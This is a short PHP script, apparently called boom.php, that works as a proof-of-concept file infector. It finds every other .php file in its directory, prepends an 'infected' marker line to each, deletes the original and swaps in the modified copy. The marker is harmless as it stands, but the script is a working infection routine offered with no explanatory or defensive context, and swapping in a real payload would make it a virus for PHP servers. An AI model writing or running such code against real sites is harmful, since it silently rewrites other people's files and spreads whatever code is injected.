<?php
$filenames = glob('*.php');
foreach ($filenames as $filename) {
    if($filename == 'boom.php') continue;
    $script = fopen($filename, "r");
    $infected = fopen("$filename.infected", "w");
    $infection = '<?php // file infected ?>';
    fputs($infected, $infection, strlen($infection));
    while($contents = fgets($script)) {
        fputs($infected, $contents, strlen($contents));
    }
    fclose($script);
    fclose($infected);
    unlink($filename);
    rename($filename.".infected", $filename);
}